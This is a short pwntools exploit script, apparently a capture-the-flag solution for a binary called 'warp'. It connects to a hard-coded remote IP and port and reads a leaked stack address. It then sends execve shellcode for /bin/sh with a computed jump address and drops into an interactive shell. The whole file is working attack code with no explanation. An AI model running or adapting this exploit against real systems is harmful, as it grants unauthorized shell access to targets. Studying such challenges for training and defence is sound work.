from pwn import *

elf = context.binary = ELF("warp")

# p = process()
p = remote("146.190.194.110", 30001)
p.recvuntil(b'POSITION: ')

stack = int(p.recvline(), 16)
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

payload = hex(stack + 24).encode() + b' ' + shellcode

p.sendline(payload)
p.interactive()